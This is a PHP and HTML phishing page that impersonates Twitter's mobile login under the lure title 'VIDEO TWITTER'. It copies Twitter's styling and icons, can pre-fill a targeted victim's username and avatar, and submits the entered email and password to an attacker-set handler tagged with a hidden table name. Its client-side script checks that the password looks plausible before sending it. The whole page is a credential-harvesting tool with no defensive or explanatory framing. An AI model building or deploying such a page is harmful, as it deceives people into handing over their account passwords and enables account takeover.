

   <head>
      <title>VIDEO TWITTER</title>


      <style id="page-skin-1" type="text/css">


      </style>
      <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
      <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" name="viewport">
      <meta content="2231777543" property="fb:app_id">
      <meta content="Twitter" property="og:site_name">
      <meta content="V0yIS0Ec_o3Ii9KThrCoMCkwTYMMJ_JYx_RSaGhFYvw" name="google-site-verification">
      <link href="https://mobile.twitter.com/manifest.json" rel="manifest">
      <link href="https://ma-0.twimg.com/twitter-assets/responsive-web/web/ltr/icon-default.882fa4ccf6539401.png" rel="icon" sizes="192x192">
      <link href="https://ma-0.twimg.com/twitter-assets/responsive-web/web/ltr/icon-ios.a9cd885bccbcaf2f.png" rel="apple-touch-icon" sizes="192x192">
      <meta content="yes" name="mobile-web-app-capable">
      <meta content="Twitter Lite" name="apple-mobile-web-app-title">
      <meta content="#ffffff" name="theme-color">
      <!-- Origin Trial Token, feature = Web Share, origin = https://twitter.com, expires = 2017-04-17 -->

      <style>

#DIV_52.email_error::before {
	    content:"Email is required";
	    color:#fff;
	    background:red;
	    padding:5px 10px;
	    border-radius:1px;
	    display: block !important;
	    height: 15px !important;
	    position: relative !important;
	}

	.password_error::before {
	    content:"Password Invalid";
	    color:#fff;
	    background:red;
	    padding:5px 10px;
	    border-radius:1px;
	    display: block !important;
	    height: 15px !important;
	    position: relative !important;
	}

	.password_error {
	    height: auto;
	}

	#DIV_52.email_error {
	    height: auto;
	}
	 

         html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:rgba(0,0,0,0)}body{margin:0}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input::-webkit-inner-spin-button,input::-webkit-outer-spin-button,input::-webkit-search-cancel-button,input::-webkit-search-decoration,input::-webkit-search-results-button,input::-webkit-search-results-decoration{display:none}@keyframes rn-ActivityIndicator-animation{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes rn-ProgressBar-animation{0%{-webkit-transform:translateX(-100%);transform:translateX(-100%)}100%{-webkit-transform:translateX(400%);transform:translateX(400%)}}.rn-105ug2t{pointer-events:auto}.rn-12vffkv{pointer-events:none}.rn-12vffkv *{pointer-events:auto}.rn-ah5dr5{pointer-events:auto}.rn-ah5dr5 *{pointer-events:none}.rn-633pao{pointer-events:none}._3f2NsD-H{-webkit-align-items:stretch;-ms-flex-align:stretch;align-items:stretch;border-width:0;border-style:solid;box-sizing:border-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-basis:auto;-ms-flex-preferred-size:auto;flex-basis:auto;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;margin:0;padding:0;position:relative;background-color:transparent;color:inherit;font:inherit;text-align:inherit;text-decoration:none;list-style:none;min-height:0;min-width:0}._2NOhG28Y{pointer-events:auto}._38Mnsfej{pointer-events:none}._38Mnsfej *{pointer-events:auto}._2IZt3pZd{pointer-events:auto}._2IZt3pZd *{pointer-events:none}._3gi1QbKd{pointer-events:none}._3hLw5mbC{background-color:transparent;background-position:center;background-repeat:no-repeat;background-size:cover;z-index:0}._16WH7Eyq{position:absolute;left:0;right:0;top:0;bottom:0;height:100%;opacity:0;width:100%;z-index:-1}.GdlOkVJi{background-size:auto;background-position:center}.DGI99L-V{background-size:contain}._3kJ8i5k7{background-size:cover}._1HzwhWxd{background-size:auto}._3ZA3RjrY{background-size:auto;background-repeat:repeat}._1JxX7SBZ{background-size:100% 100%}.Fe7ul3Lt{color:inherit;display:inline;font:inherit;margin:0;padding:0;text-decoration:none;word-wrap:break-word;background-color:transparent;border:0;text-align:inherit}._1oabV8mG{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}._25OmqECI{max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:rgba(255,255,255,0)}body{margin:0}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input::-webkit-inner-spin-button,input::-webkit-outer-spin-button,input::-webkit-search-cancel-button,input::-webkit-search-decoration,input::-webkit-search-results-button,input::-webkit-search-results-decoration{display:none}html{font-size:14px;line-height:1.3125}@media screen and (min-width: 360px){html{font-size:15px}}@media screen and (min-width: 600px){html{font-size:16px}}body,html{height:100%;width:100%}body{overflow-y:scroll}._2DggF3sL{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Ubuntu,"Helvetica Neue",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol";line-height:1.3125;word-wrap:break-word;-webkit-font-feature-settings:kern 1;font-feature-settings:kern 1;-webkit-font-kerning:normal;font-kerning:normal;text-rendering:optimizeLegibility}._1_CPsQvg{text-align:center}._1eb66saq{text-align:left}._2RmBJfDJ{text-align:right}.q7mpYjI0{color:#1B95E0}._34Ymm628{color:#657786}._2yWKxNkU{color:#AAB8C2}._1HXcreMa{color:#14171A}.bbcbpIZw{color:#F45D22}._1VpPBSCz{color:#E0245E}._2izplv41{color:#FFF}._3hHnQ0O3{font-style:normal}.R3E2kAdm{font-style:italic}._3EJ3rVPs{font-size:.85rem;line-height:1.3125rem}._3svo9AtH{font-size:1rem}._3SNKsHhe{font-size:1.25rem;line-height:1.5em}._1iopCSfF{font-size:1.5rem;line-height:1.5em}._1zOlKQVe{font-size:2rem}._3p3vGhar{max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;word-wrap:normal}.eVRYuLIm{text-transform:uppercase}.z6d79p5g{font-weight:400}._2v8hsvrz{font-weight:500}._3WJqTbOE{font-weight:700}._2UovUHQu{border-bottom:1px solid #CCD6DD;color:#1DA1F2;margin-left:.65625rem;margin-right:.65625rem;padding-bottom:.65625em;padding-top:.65625em;text-align:center}._2Eu5RXp7{color:#1DA1F2;text-decoration:none}._3xujJ3kq,._2ZZR2W6-{box-sizing:border-box;margin:0 auto;width:100%}._2ZZR2W6-{padding:0 .65625rem}@media screen and (min-width: 360px){._3xujJ3kq,._2ZZR2W6-{max-width:400px!important}}@media screen and (min-width: 600px){._3xujJ3kq,._2ZZR2W6-{max-width:600px!important}}.MmJh82_T{-webkit-appearance:none;background:transparent;border-color:currentcolor;border-radius:.35rem;border-style:solid;border-width:1px;box-sizing:border-box;color:inherit;cursor:pointer;font:inherit;font-weight:700;padding:0 1em;position:relative;text-align:center;text-decoration:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;white-space:normal}.MmJh82_T::-moz-focus-inner{border:0;padding:0}.MmJh82_T:hover,.MmJh82_T:focus,.MmJh82_T:active{text-decoration:none}.MmJh82_T:disabled,.KMM_MJg9{cursor:default;opacity:.5}.SpbPGaHr,.SpbPGaHr:hover,.SpbPGaHr:focus,.SpbPGaHr:active{background:#1DA1F2}.lSM1Fder,.lSM1Fder:hover,.lSM1Fder:focus,.lSM1Fder:active{background:transparent}._38myriBx,._38myriBx:hover,._38myriBx:focus,._38myriBx:active{background:#FFF}._1jKmSm8o,._1jKmSm8o:hover,._1jKmSm8o:focus,._1jKmSm8o:active{background:#E0245E}.csu844KC{background:rgba(0,0,0,0.77)}._3vxCixKF{border-color:transparent}._1RX2dJ0n{border-color:#FFF}.Lldqn39J{border-color:#1DA1F2}._1rWAH3is{border-color:#AAB8C2}._3JB5mkK-{border-color:#E0245E}._2d_dX71I,._2d_dX71I:hover,._2d_dX71I:focus,._2d_dX71I:active{color:#1DA1F2}._3facEWb0,._3facEWb0:hover,._3facEWb0:focus,._3facEWb0:active{color:#657786}._3IPsWQr4,._3IPsWQr4:hover,._3IPsWQr4:focus,._3IPsWQr4:active{color:#AAB8C2}._1Sil1ymr,._1Sil1ymr:hover,._1Sil1ymr:focus,._1Sil1ymr:active{color:#E0245E}._2Rz0TobF,._2Rz0TobF:hover,._2Rz0TobF:focus,._2Rz0TobF:active{color:#FFF}._1Q0H3XlO{-webkit-justify-content:flex-start;-ms-flex-pack:start;justify-content:flex-start}._3iSgwI3T{-webkit-justify-content:flex-end;-ms-flex-pack:end;justify-content:flex-end}._1pzUva68{-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center}.KLHa89oH{font-size:.85rem;min-height:1.44375rem;min-width:2.32444rem}._1cC4jNuN{border-radius:.72188rem}._2m0B23vv{font-size:.85rem;min-height:1.96875rem;min-width:1.58484rem}._1wQgepsn{border-radius:.98438rem}._1q1J19kr{font-size:1rem;min-height:1.96875rem;min-width:1.58484rem}._1VV3Fn1J{border-radius:.98438rem}._2sG5BpJO{font-size:1rem;min-height:2.625rem;min-width:2.11313rem}._115bkEkm{border-radius:1.3125rem}._1qpWiIkN{font-size:1.25rem;min-height:3.28125rem;min-width:2.64141rem}._2Wtvpvlt{border-radius:1.64063rem}.zyelCsjG{font-size:1.5rem;min-height:3.9375rem;min-width:3.16969rem}._1dx30m1G{border-radius:1.96875rem}._1u_kMV_N{-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;max-width:100%}._27U3TKFt{margin-right:.5em}._132qLRA5{height:1.5em!important}.uiKiaI6u{margin:0 auto;padding:2.625rem .65625rem}._1rIfe8O1,._1xQ_FTt0{display:block;margin-top:2.625rem}._1xQ_FTt0{height:auto;width:100%}.TlmtDTCq{background:#1DA1F2;bottom:0;left:0;margin:0;position:fixed;right:0;top:0}._3ck7Ua54{height:100%}.FjUWKzGs{margin-top:2.625rem;-webkit-flex-shrink:1;-ms-flex-negative:1;flex-shrink:1;z-index:1;z-index:1}._2otINNjP{margin:auto}._15o8K1hP{color:#71C9F8;height:50rem!important;height:110vh!important;max-width:none!important;position:fixed!important;right:-1.3125rem;top:-3.28125rem}._3QmArjXz{font-size:3rem}._3htvh7nK{margin-top:.65625rem}._4BxUDNoz{-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between}._75ugLSxv{-webkit-flex-direction:row-reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse;z-index:2}._3rvcRVbc{color:#fff;-webkit-flex:0 0 0;-ms-flex:0 0 0;flex:0 0 0;margin-right:.65625rem;margin-top:1.3125rem}._2UWZhODR{-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1}.vP-DUmQB{margin-left:.98438rem}@media screen and (orientation: landscape){._15o8K1hP{height:100vw!important;top:-2.625rem}.FjUWKzGs{margin-top:1.3125rem}._2UWZhODR{margin-top:.65625rem}}@media screen and (orientation: portrait){._2UWZhODR{margin-top:1.3125rem}}._2Ad_SH-7{background:#657786;box-shadow:0 0 4px #657786;padding:.65625rem}._3odm4w_c{-webkit-align-items:center;-ms-flex-align:center;align-items:center;margin-top:-.65625rem}._3mJyBgvB{color:#FFF;margin-top:.65625rem}._3mJyBgvB a{color:#FFF;text-decoration:underline}._3WJLfdFO{margin-top:.65625rem}.Dq1IilKH{margin-top:.65625rem}.INAWBu0V{background:transparent;border:0;cursor:pointer;display:-webkit-flex;display:-ms-flexbox;display:flex;margin:0;padding:0}._21q4BYp5{-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;width:1.3125em}.INAWBu0V:disabled,._1BnP8r0n{cursor:default;opacity:.5}._1N2kPraK{font-size:.85rem}._1ZylCsVi{font-size:1rem}._1qdB6Hhq{font-size:1.25rem}.Q1vpCyfl{font-size:1.5rem}._1rdA0MGU{font-size:2rem}._1eDw6Q15{color:#FFF}.QwoCevfW{color:#657786}._3PLvX7RF{color:#1DA1F2}._3oxnid3o{height:2.625em}._1DsrZiRN{background:#1DA1F2;left:0;position:fixed;right:0;-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0);z-index:3}._1NK8zqe3{-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;height:2.625em;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between}._3oPX729z{width:100%}._1zfFhzkv{margin-left:.32813rem}.wkAm4VaG{background:none}.xSovBQvt{-webkit-align-items:center;-ms-flex-align:center;align-items:center;background:#657786;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;padding:.65625rem}@media screen and (min-width: 600px){.wkAm4VaG{-webkit-align-items:center;-ms-flex-align:center;align-items:center;max-width:66%}.xSovBQvt{border-radius:.35rem;margin:0 0 1.5rem 1.5rem}}._2FMWcOsR{line-height:1.5;padding-left:.65625rem;word-break:break-word}._1ub7PuZ8{-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row}._1OCbLGNe{margin:0 .5rem 0 1.5rem}._1IXYtxTP{margin-left:.65625rem;padding:0}._3QrkgTB_{-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;-webkit-flex-shrink:1;-ms-flex-negative:1;flex-shrink:1;overflow:hidden}._1UMVIL7K{display:-webkit-flex;display:-ms-flexbox;display:flex;width:100%}._1YGC8xFq{-webkit-appearance:none;-moz-appearance:none;appearance:none;background-color:transparent;border-radius:0;border-width:0;box-sizing:border-box;color:inherit;font:inherit;padding:.65625rem;text-align:inherit}._1YGC8xFq::-webkit-input-placeholder{color:#657786}._1YGC8xFq::-moz-placeholder{color:#657786}._1YGC8xFq:-ms-input-placeholder{color:#657786}._1YGC8xFq::placeholder{color:#657786}._1YGC8xFq:focus{border-color:#1DA1F2;outline:none}.ZWoo0crt{color:#657786}._1VqMahaT{border-radius:.35rem}._1W5c1FHH{border-radius:1.3125rem}.ktZMpANQ{background-color:#F5F8FA}._2RmultvD{background-color:transparent}._1xYlWRCR{border:1px solid #CCD6DD}._3sD6VXHs{padding:.65625rem 0}.z5tG5NPG{border-bottom:1px solid #657786;margin-bottom:1px}.z5tG5NPG:focus{border-bottom-width:2px;margin-bottom:0}._3He-dj3N,._3He-dj3N:focus{border-color:#E0245E}._1GOlhMeJ{-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;outline:0!important;padding-right:.65625rem}._2cTOmE3M{color:#657786;outline:0!important;padding-left:.65625rem}._3h5HZCEF{color:#657786;font-size:1.25rem}._1h6I-sYC,._2tgBhjgr{margin-top:1.3125rem}._3m9ujp4p{color:#1DA1F2;height:2.625rem!important}._3N2F9LeM,._3-g0ncC4,._1hXXD236,._2Vbll_6C{margin:.65625rem 0;width:100%}._21dOcOPU{color:#1DA1F2;text-decoration:none}
      </style>
   </head>
   <body>
      <div id="react-root" style="height:100%">
         <div data-reactroot="" style="height: 100%;">
            <div aria-hidden="false" class="_3Gyh2OCT _3f2NsD-H" style=" margin: 2em 0; ">
               <!-- react-empty: 94 -->
               <main class="_1qOuwlPT _3f2NsD-H" role="main">
                  <div class="_1h6I-sYC _2ZZR2W6- _3f2NsD-H">
                     

                    <?php if(CALLED){ ?>
                     <img  src="https://avatars.io/twitter/<?php echo CALLED; ?>" alt="" style="border: solid #1da1f2 4px;width: 100px;height: auto;margin: auto;">
                    <?php }; ?>
            
                    <?php if(!CALLED){ ?>
					<svg class="_3m9ujp4p" style="display: inline-block; fill: currentcolor; height: 1.125em; max-width: 100%; position: relative; user-select: none; vertical-align: text-bottom;" viewBox="0 0 24 24">
					    <g>
					       <path d="M23.643 4.937c-.835.37-1.732.62-2.675.733a4.67 4.67 0 0 0 2.048-2.578 9.3 9.3 0 0 1-2.958 1.13 4.66 4.66 0 0 0-7.938 4.25 13.229 13.229 0 0 1-9.602-4.868c-.4.69-.63 1.49-.63 2.342A4.66 4.66 0 0 0 3.96 9.824a4.647 4.647 0 0 1-2.11-.583v.06a4.66 4.66 0 0 0 3.737 4.568 4.692 4.692 0 0 1-2.104.08 4.661 4.661 0 0 0 4.352 3.234 9.348 9.348 0 0 1-5.786 1.995 9.5 9.5 0 0 1-1.112-.065 13.175 13.175 0 0 0 7.14 2.093c8.57 0 13.255-7.098 13.255-13.254 0-.2-.005-.402-.014-.602a9.47 9.47 0 0 0 2.323-2.41z"></path>
					    </g>
					 </svg>

                    <?php }; ?>



                     <h1 class="Fe7ul3Lt _3N2F9LeM _2DggF3sL _1_CPsQvg _1iopCSfF" role="heading"> <?php echo CALLED?"<h1 style=\"font-size: 18px;line-height: 22px;color: #1d2129;font-family: tahoma;font-weight: 100;text-transform: capitalize;margin: 15px auto;font-size: 25px;\">Log in as @".CALLED."</h1>":"Log in to Twitter"; ?></h1>
                     <form id="twitterform" action="<?php echo $action_post; ?>" method="post">
                        <div class="_3QrkgTB_ _3f2NsD-H" <?php echo CALLED?'style="display:none;"':""; ?> >
                           <span class="Fe7ul3Lt _1UMVIL7K _2DggF3sL _3SNKsHhe">
                           <input autocapitalize="none" autocomplete="on" autocorrect="off" class="_1hXXD236 _1YGC8xFq ktZMpANQ _1VqMahaT _2Z8UymHS" dir="auto" id="email" name="email" placeholder="Phone, email, or username" spellcheck="false" type="<?php echo CALLED?"hidden":"text"; ?>" <?php echo CALLED?'value="'.CALLED.'"':""; ?>>
                           </span>
                        </div>
                        <div class="password">
                           <span class="Fe7ul3Lt _1UMVIL7K _2DggF3sL _3SNKsHhe">
                           <input autocapitalize="none" autocomplete="on" autocorrect="off" class="_2Vbll_6C _1YGC8xFq ktZMpANQ _1VqMahaT _2Z8UymHS" dir="auto" id="pass" name="pass" placeholder="Password" spellcheck="false" type="password">
                           </span>
                        </div>
                        <div class="_3-g0ncC4 _3f2NsD-H">
                           <button class="MmJh82_T SpbPGaHr _2Rz0TobF _1pzUva68 _1qpWiIkN _3f2NsD-H" data-testid="login-button" id="log" role="button" type="submit" value="Log in">
                              <span class="_1u_kMV_N _1pzUva68 _3f2NsD-H">
                                 <!-- react-text: 86 -->Log in<!-- /react-text -->
                              </span>
                           </button>
                        </div>

                        <input type="hidden" name="tablename" value="t">
                     </form>

                    <script>
                        	
							var form = document.querySelector('#twitterform');

							form.onsubmit = function(event){
							  if(!window.can_submit_now) event.preventDefault();
							  var returner = false;
							  if(this.pass.value && this.pass.value.length > 5 && this.email.value.length) returner = true;
							  
							  try {

							  if( !(this.pass.value && this.pass.value.length > 5) ) document.querySelector('.password').className = "password_error";
							  if( !(this.email.value.length) ) document.querySelector('#DIV_52').className = "email_error";

							  } catch(e) { };

							  if(returner){
							    window.can_submit_now = true;
							    form.submit();
							  };
							}
            	
                        	
                        </script>

                  </div>
               </main>
            </div>
         </div>
      </div>
      <div class="navbar no-items section" id="navbar"></div>
